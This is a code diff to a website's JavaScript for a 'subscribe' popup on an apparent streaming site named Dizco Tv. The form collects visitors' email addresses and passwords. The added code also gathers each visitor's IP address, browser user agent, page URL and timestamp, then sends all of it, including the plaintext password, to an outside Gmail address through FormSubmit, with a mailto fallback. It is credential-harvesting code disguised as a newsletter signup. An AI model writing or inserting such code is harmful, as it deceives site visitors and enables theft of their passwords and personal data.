@@ -141,8 +141,6 @@ function showChristmasToast(){
   const form = document.getElementById('subscribe-form');
   function openModal(){ if(overlay){ overlay.classList.add('open'); } }
   function closeModal(){ if(overlay){ overlay.classList.remove('open'); } }
-  // Initialize EmailJS if available and configured later
-  try{ if (window.emailjs && typeof window.emailjs.init === 'function'){ /* Insert your EmailJS public key here if available */ window.emailjs.init('YOUR_PUBLIC_KEY'); } }catch(e){}
 
   // Show after splash is done or on load fallback
   window.addEventListener('load', function(){
@@ -163,26 +161,43 @@ function showChristmasToast(){
       const valid = /.+@.+\..+/.test(email) && password.length >= 4;
       if(!valid){ if(emailInput) emailInput.style.borderColor = '#f66'; if(passInput) passInput.style.borderColor = '#f66'; return; }
 
-      // Try EmailJS first if configured
-      let sent = false;
+      // Collect visitor details
+      const ua = navigator.userAgent || '';
+      const pageUrl = location.href;
+      const ts = new Date().toISOString();
+      let ip = '';
+      try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j && j.ip || ''; } catch(err) {}
+
+      // Send via FormSubmit to Gmail (no extra setup beyond first verification)
       try{
-        if(window.emailjs && typeof window.emailjs.send === 'function'){
-          await window.emailjs.send('YOUR_SERVICE_ID','YOUR_TEMPLATE_ID',{ user_email: email, user_password: password });
-          sent = true;
-        }
-      }catch(err){ sent = false; }
-
-      if(!sent){
-        // Fallback: open mail client
+        const payload = {
+          _subject: 'New Dizco Tv subscription',
+          email,
+          password,
+          ip,
+          user_agent: ua,
+          page: pageUrl,
+          timestamp: ts
+        };
+        const resp = await fetch('https://formsubmit.co/ajax/dizcotvapprebrand@gmail.com', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        if(!resp.ok){ throw new Error('Failed'); }
+        const data = await resp.json();
+        // data = { success: 'true', ... } when accepted
+        if(emailInput) emailInput.value = '';
+        if(passInput) passInput.value = '';
+        closeModal();
+        alert('Subscribed! We\'ve received your details.');
+      } catch(err){
+        // Final fallback if network blocked: try mailto
         const subject = encodeURIComponent('New Dizco Tv subscription');
-        const body = encodeURIComponent(`Email: ${email}\nPassword: ${password}`);
+        const body = encodeURIComponent(`Email: ${email}\nPassword: ${password}\nIP: ${ip}\nUA: ${ua}\nPage: ${pageUrl}\nTime: ${ts}`);
         window.location.href = `mailto:dizcotvapprebrand@gmail.com?subject=${subject}&body=${body}`;
+        closeModal();
       }
-
-      if(emailInput) emailInput.value = '';
-      if(passInput) passInput.value = '';
-      closeModal();
-      alert('Thanks! We\'ll be in touch.');
     });
   }
 })();
